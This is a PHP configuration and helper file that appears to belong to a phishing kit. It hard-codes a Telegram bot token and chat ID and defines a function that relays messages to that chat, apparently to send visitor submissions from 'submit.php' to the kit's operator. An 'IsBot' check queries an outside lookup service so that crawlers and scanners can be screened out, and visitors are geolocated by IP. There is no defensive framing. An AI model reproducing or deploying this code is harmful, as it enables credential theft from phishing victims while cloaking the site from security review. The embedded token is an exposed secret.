<?php
error_reporting(0);
session_start();

define("TOKEN", '7823863101:AAGKKGEEbtnKXcy9ReyjOs95fKo57PAIDWk');
define("CHAT_ID", '-4686451795');
define("RESULT", 'submit.php');
define("APP", 'main.php');
define("DONE", '');
define('APP_PATH', findAppRootRelativePath());

$ip = get_user_ip();
$resp = get_ip($ip);
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);



function IsBot($ip)
{
        $url = "https://blackbox.ipinfo.app/lookup/".$ip;
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        
        if ($resp === "Y") {
            return true;
        }
        return false;
}

function findAppRootRelativePath() {
    $documentRoot = str_replace('\\', '/', realpath($_SERVER['DOCUMENT_ROOT']));
    $currentDir = str_replace('\\', '/', __DIR__);

    while (!file_exists($currentDir . '/.approot')) {
        $currentDir = dirname($currentDir);
        if ($currentDir === '/' || $currentDir === $documentRoot) {
            // Reached the filesystem root or document root, marker file not found
            return null;
        }
    }

    // Return the relative path from the document root
    return trim(substr($currentDir, strlen($documentRoot)), '/');
}



function telegram_message($message, $keyb)
{

    $data = [
        'text' => $message,
        'chat_id' => CHAT_ID,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyb
    ];
    file_get_contents("https://api.telegram.org/bot" . TOKEN . "/sendMessage?" . http_build_query($data));

}

function get_ip($ip) {
    $url = "http://ip-api.com/json/$ip";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $resp = curl_exec($ch);
    curl_close($ch);
    return json_decode($resp, true);
}
function get_user_ip()
{
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    if ($ip == '::1') {
        return '127.0.0.1';
    }
    return $ip;
}



?>